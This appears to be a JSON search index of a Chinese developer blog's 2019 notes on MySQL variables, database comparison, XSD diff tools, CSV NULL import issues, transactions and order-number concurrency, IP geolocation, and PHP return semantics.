全螢幕功能小記","uri":"/blog/posts/CSS-fullscreen-%E5%85%A8%E8%9E%A2%E5%B9%95%E5%8A%9F%E8%83%BD%E5%B0%8F%E8%A8%98/"},{"categories":["實用工具"],"content":"今天看到有用 API 查 IP 是哪個國家方法 不知 Server 會真的這樣做? (打外面網站) 我一直以為可以直接看 IP 方式分辨 所以爬了一下文 ","date":"2019-09-17","objectID":"/blog/posts/%E6%8A%93-IP-%E5%8F%96%E5%BE%97%E5%9C%8B%E5%AE%B6%E8%B3%87%E8%A8%8A%E6%96%B9%E6%B3%95/:0:0","tags":["ip"],"title":"抓 IP 取得國家資訊方法","uri":"/blog/posts/%E6%8A%93-IP-%E5%8F%96%E5%BE%97%E5%9C%8B%E5%AE%B6%E8%B3%87%E8%A8%8A%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"Discuz 解析IP 位置 記得以前進去某些論壇可以看到 訪客 國家 找了一下，真的不需要打 API Discuz!开发之IP地址的解析方法 - 土著人宁巴的Discuz!专栏 - CSDN博客 ","date":"2019-09-17","objectID":"/blog/posts/%E6%8A%93-IP-%E5%8F%96%E5%BE%97%E5%9C%8B%E5%AE%B6%E8%B3%87%E8%A8%8A%E6%96%B9%E6%B3%95/:1:0","tags":["ip"],"title":"抓 IP 取得國家資訊方法","uri":"/blog/posts/%E6%8A%93-IP-%E5%8F%96%E5%BE%97%E5%9C%8B%E5%AE%B6%E8%B3%87%E8%A8%8A%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"免費打 API 有看到這個 API 沒有限制一天打的流量 ip2c.org | free IP to Country server | self-updating every day ","date":"2019-09-17","objectID":"/blog/posts/%E6%8A%93-IP-%E5%8F%96%E5%BE%97%E5%9C%8B%E5%AE%B6%E8%B3%87%E8%A8%8A%E6%96%B9%E6%B3%95/:2:0","tags":["ip"],"title":"抓 IP 取得國家資訊方法","uri":"/blog/posts/%E6%8A%93-IP-%E5%8F%96%E5%BE%97%E5%9C%8B%E5%AE%B6%E8%B3%87%E8%A8%8A%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"可抓 IP 資料到本地端 ","date":"2019-09-17","objectID":"/blog/posts/%E6%8A%93-IP-%E5%8F%96%E5%BE%97%E5%9C%8B%E5%AE%B6%E8%B3%87%E8%A8%8A%E6%96%B9%E6%B3%95/:3:0","tags":["ip"],"title":"抓 IP 取得國家資訊方法","uri":"/blog/posts/%E6%8A%93-IP-%E5%8F%96%E5%BE%97%E5%9C%8B%E5%AE%B6%E8%B3%87%E8%A8%8A%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"MAXMIND GeoLite2 Free Downloadable Databases « MaxMind Developer Site GeoIP2 Downloadable Databases « MaxMind Developer Site 連套件都幫妳寫好了!!!真佛心 ","date":"2019-09-17","objectID":"/blog/posts/%E6%8A%93-IP-%E5%8F%96%E5%BE%97%E5%9C%8B%E5%AE%B6%E8%B3%87%E8%A8%8A%E6%96%B9%E6%B3%95/:3:1","tags":["ip"],"title":"抓 IP 取得國家資訊方法","uri":"/blog/posts/%E6%8A%93-IP-%E5%8F%96%E5%BE%97%E5%9C%8B%E5%AE%B6%E8%B3%87%E8%A8%8A%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"DBIP Free IP Geolocation Database Downloads | DB-IP Lite ","date":"2019-09-17","objectID":"/blog/posts/%E6%8A%93-IP-%E5%8F%96%E5%BE%97%E5%9C%8B%E5%AE%B6%E8%B3%87%E8%A8%8A%E6%96%B9%E6%B3%95/:3:2","tags":["ip"],"title":"抓 IP 取得國家資訊方法","uri":"/blog/posts/%E6%8A%93-IP-%E5%8F%96%E5%BE%97%E5%9C%8B%E5%AE%B6%E8%B3%87%E8%A8%8A%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"其他 API 網站 Tutorials and Code Samples for Finding Website Visitor Country Data What is the Best IP Geolocation API? - The ipdata Team - Medium IP Info, IP Geolocation Tools and API| IPInfoDB geolocation - Best IP to Country Database - Stack Overflow geolocation - Best IP to Country Database - Stack Overflow 有空用在補充 ","date":"2019-09-17","objectID":"/blog/posts/%E6%8A%93-IP-%E5%8F%96%E5%BE%97%E5%9C%8B%E5%AE%B6%E8%B3%87%E8%A8%8A%E6%96%B9%E6%B3%95/:4:0","tags":["ip"],"title":"抓 IP 取得國家資訊方法","uri":"/blog/posts/%E6%8A%93-IP-%E5%8F%96%E5%BE%97%E5%9C%8B%E5%AE%B6%E8%B3%87%E8%A8%8A%E6%96%B9%E6%B3%95/"},{"categories":["MySQL"],"content":"最近重複的工作做一些改進 如每個月重複執行 SQL 內容 需要更快、還要更方便設定方法 ","date":"2019-09-15","objectID":"/blog/posts/MySQL-%E4%BD%BF%E7%94%A8%E8%AE%8A%E6%95%B8%E5%92%8C-vscode-%E5%BF%AB%E9%80%9F%E7%94%A2%E7%94%9F%E5%85%A7%E5%AE%B9%E7%AF%84%E6%9C%AC/:0:0","tags":["mysql"],"title":"MySQL 使用變數和 vscode 快速產生內容範本","uri":"/blog/posts/MySQL-%E4%BD%BF%E7%94%A8%E8%AE%8A%E6%95%B8%E5%92%8C-vscode-%E5%BF%AB%E9%80%9F%E7%94%A2%E7%94%9F%E5%85%A7%E5%AE%B9%E7%AF%84%E6%9C%AC/"},{"categories":["MySQL"],"content":"MySQL set variable set @_id = xxx; -- SELECT MAX(id)+1 FROM `xxx` set @name = 'name'; -- SELECT * FROM `xxx` WHERE name LIKE '%name%' set @money = -140; -- how much set @end = NULL; -- format(EX:2018-10-26 19:00:00) or NULL set @bye_date = NULL; -- format(EX:2018-10-26 19:00:00) or NULL INSERT INTO `pay_type`(id,name,money) VALUES(@_id,@name,@money); ... MySQL :: MySQL 8.0 Reference Manual :: 13.7.6.1 SET Syntax for Variable Assignment 有用過，不能用在 CREATE TABLE ... ","date":"2019-09-15","objectID":"/blog/posts/MySQL-%E4%BD%BF%E7%94%A8%E8%AE%8A%E6%95%B8%E5%92%8C-vscode-%E5%BF%AB%E9%80%9F%E7%94%A2%E7%94%9F%E5%85%A7%E5%AE%B9%E7%AF%84%E6%9C%AC/:1:0","tags":["mysql"],"title":"MySQL 使用變數和 vscode 快速產生內容範本","uri":"/blog/posts/MySQL-%E4%BD%BF%E7%94%A8%E8%AE%8A%E6%95%B8%E5%92%8C-vscode-%E5%BF%AB%E9%80%9F%E7%94%A2%E7%94%9F%E5%85%A7%E5%AE%B9%E7%AF%84%E6%9C%AC/"},{"categories":["MySQL"],"content":"vscode Blueprint 不管任何程式都可以使用 詳細看裡面的測試圖片就可以了解怎麼使用 reesemclean/blueprint: Create files and folders of files from templates in Visual Studio Code ./blueprint-templates/測試demo/__name__test.sql CREATE TABLE `xxxx`.`{{ $table }}` ( `id` int(11) NOT NULL auto_increment, `s` varchar(10) NOT NULL, `s2` varchar(10) NOT NULL, `user_number` varchar(100) NOT NULL, PRIMARY KEY (`id`) KEY `s` (`s`), KEY `s2` (`s2`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='{{$表格註解}}' AUTO_INCREMENT=1 ; ","date":"2019-09-15","objectID":"/blog/posts/MySQL-%E4%BD%BF%E7%94%A8%E8%AE%8A%E6%95%B8%E5%92%8C-vscode-%E5%BF%AB%E9%80%9F%E7%94%A2%E7%94%9F%E5%85%A7%E5%AE%B9%E7%AF%84%E6%9C%AC/:2:0","tags":["mysql"],"title":"MySQL 使用變數和 vscode 快速產生內容範本","uri":"/blog/posts/MySQL-%E4%BD%BF%E7%94%A8%E8%AE%8A%E6%95%B8%E5%92%8C-vscode-%E5%BF%AB%E9%80%9F%E7%94%A2%E7%94%9F%E5%85%A7%E5%AE%B9%E7%AF%84%E6%9C%AC/"},{"categories":["MySQL"],"content":"其他小記 有一個 Blueprint 跟 API Blueprint 沒有關係 相關教學連結 Kewang 的資訊進化論 - 貼文 ","date":"2019-09-15","objectID":"/blog/posts/MySQL-%E4%BD%BF%E7%94%A8%E8%AE%8A%E6%95%B8%E5%92%8C-vscode-%E5%BF%AB%E9%80%9F%E7%94%A2%E7%94%9F%E5%85%A7%E5%AE%B9%E7%AF%84%E6%9C%AC/:3:0","tags":["mysql"],"title":"MySQL 使用變數和 vscode 快速產生內容範本","uri":"/blog/posts/MySQL-%E4%BD%BF%E7%94%A8%E8%AE%8A%E6%95%B8%E5%92%8C-vscode-%E5%BF%AB%E9%80%9F%E7%94%A2%E7%94%9F%E5%85%A7%E5%AE%B9%E7%AF%84%E6%9C%AC/"},{"categories":["MySQL"],"content":"先留者，有空再實作看看 Red-Gate’s MySQL Schema \u0026 Data Compare (Commercial) Maatkit (now Percona) liquibase Toad Nob Hill Database Compare (Commercial) MySQL Diff SQL EDT (Commercial) Compare two MySQL databases - Stack Overflow 檔案收發系統 - IT閱讀 2019-10-07 聽說可以 table 比對 table 產生 sql 語法 查了一下還真的有!! (1) How to Compare two Databases using MySQL Workbench - YouTube (1) mysql compare databases and sync | Mysql tutorial - YouTube mmatuson/SchemaSync: A MySQL Schema Versioning and Migration Utility [Mysql] 使用mysqldiff和mysqldbcompare检查数据一致性 | zeven’s blog $ mysqldbcompare --server1=root:root@localhost --server2=root:root@localhost db1:db2 --changes-for=server1 -a --difftype=sql # WARNING: Objects in server1.db1 but not in server1.db2: # TABLE: table2 # # WARNING: Objects in server1.db2 but not in server1.tb1: # TABLE: table3 # # Defn Row Data # Type Object Name Diff Count Check #------------------------------------------------------------------------- # TABLE t1 pass pass - # - Compare table checksum FAIL # - Find row differences FAIL # # Transformation for --changes-for=server1: # # Data differences found among rows: UPDATE db1.t1 SET b = 'Test 123' WHERE a = '1'; UPDATE db1.t1 SET b = 'Test 789' WHERE a = '3'; DELETE FROM db1.t1 WHERE a = '4'; INSERT INTO db1.t1 (a, b) VALUES('5', 'New row - db2'); # Database consistency check failed. # # ...done mysqldbcompare MySQL数据库比较工具 - 歪麦博客 ","date":"2019-09-12","objectID":"/blog/posts/MySQL-%E6%AF%94%E8%BC%83%E5%85%A9%E5%80%8B%E8%B3%87%E6%96%99%E5%BA%AB%E6%96%B9%E6%B3%95/:0:0","tags":["mysql"],"title":"MySQL 比較兩個資料庫方法","uri":"/blog/posts/MySQL-%E6%AF%94%E8%BC%83%E5%85%A9%E5%80%8B%E8%B3%87%E6%96%99%E5%BA%AB%E6%96%B9%E6%B3%95/"},{"categories":["XML"],"content":"最近收到要異動 XML 在很大的 XML 中 我需要尋找異動的 tag 尋找有用工具來分析 XSD ","date":"2019-09-11","objectID":"/blog/posts/XSD-%E5%BF%AB%E9%80%9F%E6%AF%94%E8%BC%83%E5%B7%AE%E7%95%B0%E7%9A%84%E5%B7%A5%E5%85%B7/:0:0","tags":["xsd"],"title":"XSD 快速比較差異的工具","uri":"/blog/posts/XSD-%E5%BF%AB%E9%80%9F%E6%AF%94%E8%BC%83%E5%B7%AE%E7%95%B0%E7%9A%84%E5%B7%A5%E5%85%B7/"},{"categories":["XML"],"content":"NVM 安裝 Chocolatey Gallery | Maven 3.6.1.20190711 快速解決安裝環境的問題XD ","date":"2019-09-11","objectID":"/blog/posts/XSD-%E5%BF%AB%E9%80%9F%E6%AF%94%E8%BC%83%E5%B7%AE%E7%95%B0%E7%9A%84%E5%B7%A5%E5%85%B7/:1:0","tags":["xsd"],"title":"XSD 快速比較差異的工具","uri":"/blog/posts/XSD-%E5%BF%AB%E9%80%9F%E6%AF%94%E8%BC%83%E5%B7%AE%E7%95%B0%E7%9A%84%E5%B7%A5%E5%85%B7/"},{"categories":["XML"],"content":"Schema Diff Command Line Tool Schema Diff Tool 可這邊下載檔案soa-model-distribution-1.6.0-bin.zip 解壓縮出來 需要設定 SOA_MODEL_HOME 環境變數 再設定 path += %SOA_MODEL_HOME%\\bin 更懶的話，直接到bin資料夾做 schemadiff \u003c\u003cfirst schema\u003e\u003e \u003c\u003csecond schema\u003e\u003e [\u003c\u003coutput directory\u003e\u003e] C:\\soa-model-distribution-1.4.X\u003ebin\\schemadiff samples\\diff\\original\\article.xsd samples\\diff\\modified\\article.xsd schema-diff-output 會產生 HTML 檔案 這可說是非常完美的格式 有順利執行 ","date":"2019-09-11","objectID":"/blog/posts/XSD-%E5%BF%AB%E9%80%9F%E6%AF%94%E8%BC%83%E5%B7%AE%E7%95%B0%E7%9A%84%E5%B7%A5%E5%85%B7/:2:0","tags":["xsd"],"title":"XSD 快速比較差異的工具","uri":"/blog/posts/XSD-%E5%BF%AB%E9%80%9F%E6%AF%94%E8%BC%83%E5%B7%AE%E7%95%B0%E7%9A%84%E5%B7%A5%E5%85%B7/"},{"categories":["XML"],"content":"xsdiff valters/xsdiff: Compare XML XSD schemas with semantic diff, simple and straight differences report. Perfect if you need to see what has changed in huge schema file. 安裝很簡單 mvn clean install # 單個檔案 java -jar XsDiff-app/target/xsdiff-app-1.0.0.jar old/xxx.xsd new/xxx.xsd # 多個比較 # 記得每個資料夾需要放schema.lst XSD 清單 java -jar XsDiff-app/target/xsdiff-app-1.0.0.jar old/ new/ xsdiff/Main.java at 0a31b666979a88e4bdf49b29c32947864a0a965c · valters/xsdiff 有順利跑出來，但是比較像文字 diff 比較 ","date":"2019-09-11","objectID":"/blog/posts/XSD-%E5%BF%AB%E9%80%9F%E6%AF%94%E8%BC%83%E5%B7%AE%E7%95%B0%E7%9A%84%E5%B7%A5%E5%85%B7/:3:0","tags":["xsd"],"title":"XSD 快速比較差異的工具","uri":"/blog/posts/XSD-%E5%BF%AB%E9%80%9F%E6%AF%94%E8%BC%83%E5%B7%AE%E7%95%B0%E7%9A%84%E5%B7%A5%E5%85%B7/"},{"categories":["XML"],"content":"XSD Compare yoep/xsd-compare: Compare different XSD version files to each other 因為我裝JAVA 10 所以需要改pom.xml javafx-maven-plugin/javafx-maven-plugin: Maven plugin for JavaFX Support for current JDK 9 and JDK 10 · Issue #287 · javafx-maven-plugin/javafx-maven-plugin \u003cpluginRepositories\u003e \u003cpluginRepository\u003e \u003cid\u003eoss-sonatype-snapshots\u003c/id\u003e \u003curl\u003ehttps://oss.sonatype.org/content/groups/public/\u003c/url\u003e \u003csnapshots\u003e \u003cenabled\u003etrue\u003c/enabled\u003e \u003c/snapshots\u003e \u003c/pluginRepository\u003e \u003c/pluginRepositories\u003e 上面 xml 放在 \u003cbuild\u003e前面 \u003cplugin\u003e \u003cgroupId\u003ecom.zenjava\u003c/groupId\u003e \u003cartifactId\u003ejavafx-maven-plugin\u003c/artifactId\u003e \u003cversion\u003e8.9.0-SNAPSHOT\u003c/version\u003e \u003cconfiguration\u003e \u003cappName\u003eXSD Compare\u003c/appName\u003e \u003ctitle\u003eXSD Compare\u003c/title\u003e 在修改版本 mvn clean install # 完成編譯，可直接執行 java -jar ./target/xsd-compare-0.0.6-SNAPSHOT.jar GUI 介面看起來很炫 但是我的 xml 不能開啟 orz ","date":"2019-09-11","objectID":"/blog/posts/XSD-%E5%BF%AB%E9%80%9F%E6%AF%94%E8%BC%83%E5%B7%AE%E7%95%B0%E7%9A%84%E5%B7%A5%E5%85%B7/:4:0","tags":["xsd"],"title":"XSD 快速比較差異的工具","uri":"/blog/posts/XSD-%E5%BF%AB%E9%80%9F%E6%AF%94%E8%BC%83%E5%B7%AE%E7%95%B0%E7%9A%84%E5%B7%A5%E5%85%B7/"},{"categories":["XML"],"content":"小記 目前還是Schema Diff Command Line Tool最實用 不果改天找到更好用的工具在更新 ","date":"2019-09-11","objectID":"/blog/posts/XSD-%E5%BF%AB%E9%80%9F%E6%AF%94%E8%BC%83%E5%B7%AE%E7%95%B0%E7%9A%84%E5%B7%A5%E5%85%B7/:5:0","tags":["xsd"],"title":"XSD 快速比較差異的工具","uri":"/blog/posts/XSD-%E5%BF%AB%E9%80%9F%E6%AF%94%E8%BC%83%E5%B7%AE%E7%95%B0%E7%9A%84%E5%B7%A5%E5%85%B7/"},{"categories":["MySQL"],"content":"最近找 MySQL 有什麼跳脫字元函式 有爬到 QUOTE() 可以用 但比較特別 mysql\u003e SELECT QUOTE('w3re''source'); +-----------------------+ | QUOTE('w3re''source') | +-----------------------+ | 'w3re\\'source' | +-----------------------+ 1 row in set (0.03 sec) MySQL QUOTE() function - w3resource ","date":"2019-09-10","objectID":"/blog/posts/MySQL-QUOTE-%E8%B7%B3%E8%84%AB%E5%AD%97%E5%85%83%E5%B0%8F%E8%A8%98/:0:0","tags":["mysql"],"title":"MySQL QUOTE() 跳脫字元小記","uri":"/blog/posts/MySQL-QUOTE-%E8%B7%B3%E8%84%AB%E5%AD%97%E5%85%83%E5%B0%8F%E8%A8%98/"},{"categories":["MySQL"],"content":"注意事項 NULL 會回傳 NULL 字串!!! 這一點還滿神奇的 字串會被'包住 透過這種特性，我可以用 SQL 組我要的字串 ","date":"2019-09-10","objectID":"/blog/posts/MySQL-QUOTE-%E8%B7%B3%E8%84%AB%E5%AD%97%E5%85%83%E5%B0%8F%E8%A8%98/:1:0","tags":["mysql"],"title":"MySQL QUOTE() 跳脫字元小記","uri":"/blog/posts/MySQL-QUOTE-%E8%B7%B3%E8%84%AB%E5%AD%97%E5%85%83%E5%B0%8F%E8%A8%98/"},{"categories":["MySQL"],"content":"組 sql 範例 select concat(\"UPDATE oo SET a1 = \",quote(a1), \", a2 = \",quote(a2), \" WHERE id =\", bbb.id,\";\") FROM xxxx inner join bbb on ........ 組完可以匯出 csv 可以用我之前寫的malagege/sqlMakecsv: for a sqltocsv package easy sample 這時候會發現 csv 內容每一行前後都會有 \" 一行式 SQL 可以用正規化解決 但是多行的呢? 我想到解決方法 用csv2xlsx 轉 xlsx csv2xlsx CSV 轉 Excel 方法 | 程式狂想筆記 xlsx 複製裡面內容出來 發現還是有 \" 開啟 Word 把所有內容選擇性天上→超連結貼上上面，即可解決!!! QUOTE跳脫字元函式可以解決\",'問題 ","date":"2019-09-10","objectID":"/blog/posts/MySQL-QUOTE-%E8%B7%B3%E8%84%AB%E5%AD%97%E5%85%83%E5%B0%8F%E8%A8%98/:1:1","tags":["mysql"],"title":"MySQL QUOTE() 跳脫字元小記","uri":"/blog/posts/MySQL-QUOTE-%E8%B7%B3%E8%84%AB%E5%AD%97%E5%85%83%E5%B0%8F%E8%A8%98/"},{"categories":["MySQL"],"content":"最近自己產生出來的 csv 匯入 DB遇到一些問題 之前 csv 快速建立 MySQL 資料表方法 | 程式狂想筆記 真的建立資料表很方便 但最近採到一些雷 在這邊整理一下 ","date":"2019-09-09","objectID":"/blog/posts/CSV-%E5%8C%AF%E5%85%A5%E5%88%B0-MySQL-%E5%A4%B1%E6%95%97%E5%B0%8F%E8%A8%98-Data-truncation-Incorrect-date-value-for-column-date-col-at-row-1/:0:0","tags":["mysql","csv"],"title":"CSV 匯入到 MySQL 失敗小記(Data truncation: Incorrect date value: '' for column 'date_col' at row 1)","uri":"/blog/posts/CSV-%E5%8C%AF%E5%85%A5%E5%88%B0-MySQL-%E5%A4%B1%E6%95%97%E5%B0%8F%E8%A8%98-Data-truncation-Incorrect-date-value-for-column-date-col-at-row-1/"},{"categories":["MySQL"],"content":"用腳本 create table 失敗 csv 快速建立 MySQL 資料表方法 | 程式狂想筆記 用裡面腳本create table竟然失敗 Row size too large. The maximum row size for the used table type, not counting BLOBs, is 65535. This includes storage overhead, check the manual. You have to change some columns to TEXT or BLOBs 簡單說一下，就是一個varchar 是有限制大小，可能轉成text或著去原本 SQL 把他 create table 匯出來就可以了 相關連結: 10.4 限制表的列數和行的大小 - IT閱讀 10.4 限制表的列数和行的大小 - 程序园 ","date":"2019-09-09","objectID":"/blog/posts/CSV-%E5%8C%AF%E5%85%A5%E5%88%B0-MySQL-%E5%A4%B1%E6%95%97%E5%B0%8F%E8%A8%98-Data-truncation-Incorrect-date-value-for-column-date-col-at-row-1/:1:0","tags":["mysql","csv"],"title":"CSV 匯入到 MySQL 失敗小記(Data truncation: Incorrect date value: '' for column 'date_col' at row 1)","uri":"/blog/posts/CSV-%E5%8C%AF%E5%85%A5%E5%88%B0-MySQL-%E5%A4%B1%E6%95%97%E5%B0%8F%E8%A8%98-Data-truncation-Incorrect-date-value-for-column-date-col-at-row-1/"},{"categories":["MySQL"],"content":"Data truncation: Incorrect date value: ’’ for column ‘date_col’ at row 1 這個問題困擾我很久了 我後來發現是 NULL 在 csv 跟空字串一樣 (這卻說csv ,, 跟 ,\"\", 都是一樣的…) 好像 csv 跟 txt 沒法表示 NULL 不過有看到官網\\n可以代表是 NULL MySQL :: MySQL 8.0 Reference Manual :: 9.1.7 NULL Values 但是我是用別的程式匯出 csv dbeaver 嘗試著匯出，再用 dbeaver 匯入 結果一樣會有這個問題….(沒有看到\\n) 這還是未解之謎 但不知道是不是用 dbeaver 跟用 SELECT ... INTO OUTFILE 原理不一樣 MySQL :: MySQL 8.0 Reference Manual :: 13.2.7 LOAD DATA Syntax ","date":"2019-09-09","objectID":"/blog/posts/CSV-%E5%8C%AF%E5%85%A5%E5%88%B0-MySQL-%E5%A4%B1%E6%95%97%E5%B0%8F%E8%A8%98-Data-truncation-Incorrect-date-value-for-column-date-col-at-row-1/:2:0","tags":["mysql","csv"],"title":"CSV 匯入到 MySQL 失敗小記(Data truncation: Incorrect date value: '' for column 'date_col' at row 1)","uri":"/blog/posts/CSV-%E5%8C%AF%E5%85%A5%E5%88%B0-MySQL-%E5%A4%B1%E6%95%97%E5%B0%8F%E8%A8%98-Data-truncation-Incorrect-date-value-for-column-date-col-at-row-1/"},{"categories":["MySQL"],"content":"解決方法 標註 NULL 特殊字串 CSV import NULL string mark support · Issue #4223 · dbeaver/dbeaver MySQL Export Table to CSV 標註 NULL 欄位很簡單ifnull(my_column, \"\") DBeaver 匯入可以選擇 null 取代 STR_TO_DATE How to import a CSV file into a MySQL database? - Miguel Gomez - Medium SELECT STR_TO_DATE(date_col), \"%M %d %Y\"); STR_TO_DATE(\"\", “%M %d %Y”) 0000-00-00 STR_TO_DATE(NULL, “%M %d %Y”) NULL 目前猜測 load data local infile 'file.txt' into table tableName SET payDate = str_to_date(@payDate, '%d/%m/%Y'); @payDate 應該是 ’’ 空字串 IF 大法 MySQL load NULL values from CSV data - Stack Overflow LOAD DATA infile '/tmp/testdata.txt' INTO TABLE moo fields terminated BY \",\" lines terminated BY \"\\n\" (@vone, @vtwo, @vthree, @vfour, @vfive) SET one = nullif(@vone,''), two = nullif(@vtwo,''), three = nullif(@vthree,''), four = nullif(@vfour,'') ; 與上方法大同小異，但我覺得上一種方法會比較好處理 NULL 放到 date欄位 ,, 取代法(不要這樣用) 這個方法 ,, 會取代掉空字串 所以不要這樣用 QQ 感覺還是沒有好用的方法 匯出直接轉 sql 出來還是最方便的 mysql null problem? - Stack Overflow PHP 執行方法 剛剛爬到有做 null 處理 sql - MySQL - SELECT * INTO OUTFILE LOCAL ? - Stack Overflow wget https://gist.githubusercontent.com/paslandau/37bf787eab1b84fc7ae679d1823cf401/raw/29a48bb0a43f6750858e1ddec054d3552f3cbc45/mysql2csv -O mysql2csv -q \u0026\u0026 (sha256sum mysql2csv | cmp \u003c(echo \"b109535b29733bd596ecc8608e008732e617e97906f119c66dd7cf6ab2865a65 mysql2csv\") || (echo \"ERROR comparing hash, Found:\" ;sha256sum mysql2csv) ) \u0026\u0026 chmod +x mysql2csv 發現新的 sqltocsv 工具 StabbyCutyou/sqltocsv: Stream large SQL result sets into a local file 但不知道有沒有對 null 做處理 karissa/sql2csv: Commandline utility for easily converting a SQL select statement into csv ","date":"2019-09-09","objectID":"/blog/posts/CSV-%E5%8C%AF%E5%85%A5%E5%88%B0-MySQL-%E5%A4%B1%E6%95%97%E5%B0%8F%E8%A8%98-Data-truncation-Incorrect-date-value-for-column-date-col-at-row-1/:2:1","tags":["mysql","csv"],"title":"CSV 匯入到 MySQL 失敗小記(Data truncation: Incorrect date value: '' for column 'date_col' at row 1)","uri":"/blog/posts/CSV-%E5%8C%AF%E5%85%A5%E5%88%B0-MySQL-%E5%A4%B1%E6%95%97%E5%B0%8F%E8%A8%98-Data-truncation-Incorrect-date-value-for-column-date-col-at-row-1/"},{"categories":["SQL"],"content":"最近在想 phpmyadmin 到底能不能做到錯誤時 rollback 先講結論…應該是不行的 執行 phpmyadmin 時候好像沒被法判斷有沒有錯誤(指令的好像也一樣…) 有什麼新發現，之後再修改 我覺得最佳實例應該要用類似 DB client 執行 手動切換交易模式(把 autocommit 關掉) 執行每一段 SQL 後，確定 SQL 都執行正確 依照結果手動下 commit 或 rollback 改資料前可以先備份資料 stored procedure 可以做到 但因為沒什麼機會寫這個，所以先留著 sql - MySQL : transaction within a stored procedure - Stack Overflow sql - try….catch in mysql for transaction? - Stack Overflow ","date":"2019-09-08","objectID":"/blog/posts/%E5%9F%B7%E8%A1%8C-SQL-%E5%81%9A-rollback-%E6%96%B9%E6%B3%95/:0:0","tags":["sql"],"title":"執行 SQL 做 rollback 方法 \u0026 訂單編號高併發的小記","uri":"/blog/posts/%E5%9F%B7%E8%A1%8C-SQL-%E5%81%9A-rollback-%E6%96%B9%E6%B3%95/"},{"categories":["SQL"],"content":"isnert 失敗 auto_increment ALTER TABLE tbl auto_increment = 1 但有部分答案建議不要調整 auto_increment MySQL Auto Increment Columns on TRANSACTION, COMMIT, and ROLLBACK - Stack Overflow transactions - MySQL AUTO_INCREMENT does not ROLLBACK - Stack Overflow 後來我想到 insert into xxx values( select max(xxx) + 1 from xxx,’test’ ); 會不會有高併發的問題 (其實很多程式都這樣寫) 之前類似寫過 MySQL(MariaDB) insert有關做相同表會遇到問題小記 | 程式狂想筆記 ","date":"2019-09-08","objectID":"/blog/posts/%E5%9F%B7%E8%A1%8C-SQL-%E5%81%9A-rollback-%E6%96%B9%E6%B3%95/:1:0","tags":["sql"],"title":"執行 SQL 做 rollback 方法 \u0026 訂單編號高併發的小記","uri":"/blog/posts/%E5%9F%B7%E8%A1%8C-SQL-%E5%81%9A-rollback-%E6%96%B9%E6%B3%95/"},{"categories":["SQL"],"content":"如何生產唯一訂單編號 額外新開一個 table ，做訂單編號處理 用 SELECT ... FOR UPDATR處理 一直看到公司有看到商品編號額外開了一個 table 現在有一種恍然大悟的感覺 但開發者沒有加 FOR UPDATE 後來的 commit 有補上 FOR UPDATE 相關 for update 處理 用 SELECT … FOR UPDATE 避免 Race condition @ Vexed’s Blog :: 隨意窩 Xuite日誌 MySQL 在高并发下的 订单撮合 系统使用 共享锁 与 排他锁 保证数据一致性 - 指尖下的幽灵 - 博客园 更好的方法還有透過 redis 去做 java web系统在高并发下如何实现订单号生成唯一？ - 知乎 備份圖 Redis 高并发问题,及解决方案！ - 简书 備份圖 分布式架构系统生成全局唯一序列号的一个思路 - 知乎 備份圖 其實這篇我原本主要是要紀錄 sql file 做 rollback 但沒想到…從isnert 失敗 auto_increment到如何生產唯一訂單編號我覺得非常重要 就先記錄了 ","date":"2019-09-08","objectID":"/blog/posts/%E5%9F%B7%E8%A1%8C-SQL-%E5%81%9A-rollback-%E6%96%B9%E6%B3%95/:2:0","tags":["sql"],"title":"執行 SQL 做 rollback 方法 \u0026 訂單編號高併發的小記","uri":"/blog/posts/%E5%9F%B7%E8%A1%8C-SQL-%E5%81%9A-rollback-%E6%96%B9%E6%B3%95/"},{"categories":["SQL"],"content":"mysql 執行 .sql How to Run SQL Text File on MySQL Command Prompt – TecAdmin ","date":"2019-09-08","objectID":"/blog/posts/%E5%9F%B7%E8%A1%8C-SQL-%E5%81%9A-rollback-%E6%96%B9%E6%B3%95/:3:0","tags":["sql"],"title":"執行 SQL 做 rollback 方法 \u0026 訂單編號高併發的小記","uri":"/blog/posts/%E5%9F%B7%E8%A1%8C-SQL-%E5%81%9A-rollback-%E6%96%B9%E6%B3%95/"},{"categories":["PHP"],"content":"今天看到我同事用 return 寫在 xxx.php(沒有寫在 return 裡面) 我印象中 return 通常都寫在 function 裡面 查看了一下官方文件 PHP: return - Manual 可以寫在 function 外面 ","date":"2019-09-08","objectID":"/blog/posts/PHP-return-%E7%89%B9%E5%88%A5%E7%9A%84%E7%94%A8%E6%B3%95%E5%B0%8F%E8%A8%98/:0:0","tags":["return"],"title":"PHP return 特別的用法小記","uri":"/blog/posts/PHP-return-%E7%89%B9%E5%88%A5%E7%9A%84%E7%94%A8%E6%B3%95%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"先講講單一文件 文件有講到 return 不是一個 function 先講講這個跟 die/exit哪裡不一樣 \u003c?php return 2; exit(2); 要怎麼看錯誤碼，我以前這篇寫過 linux 設定環境變數 | 程式狂想筆記 $?是指令回傳錯誤碼 ","date":"2019-09-08","objectID":"/blog/posts/PHP-return-%E7%89%B9%E5%88%A5%E7%9A%84%E7%94%A8%E6%B3%95%E5%B0%8F%E8%A8%98/:1:0","tags":["return"],"title":"PHP return 特別的用法小記","uri":"/blog/posts/PHP-return-%E7%89%B9%E5%88%A5%E7%9A%84%E7%94%A8%E6%B3%95%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"有做 include 文件 如果在全局範圍中調用，則當前腳本文件中止運行。如果當前腳本文件是被 include 的或者 require 的，則控制交回調用文件。此外，如果當前腳本是被 include 的，則 return 的值會被當作 include 調用的返回值。如果在主腳本文件中調用 return，則腳本中止運行。如果當前腳本文件是在 php.ini 中的配置選項 auto_prepend_file 或者 auto_append_file 所指定的，則此腳本文件中止運行。 我覺得先看範例 a.php \u003c?php include(\"b.php\"); echo \"a\"; ?\u003e b.php \u003c?php echo \"b\"; return; ?\u003e (executing a.php:) will echo “ba”. whereas (b.php modified): a.php \u003c?php include(\"b.php\"); echo \"a\"; ?\u003e b.php \u003c?php echo \"b\"; exit; ?\u003e (executing a.php:) will echo “b”. ** 小心 global namespace ** a.php \u003c?php include 'b.php'; foo(); ?\u003e b.php \u003c?php return; function foo() { echo 'foo'; } ?\u003e Executing a.php will output “foo”. 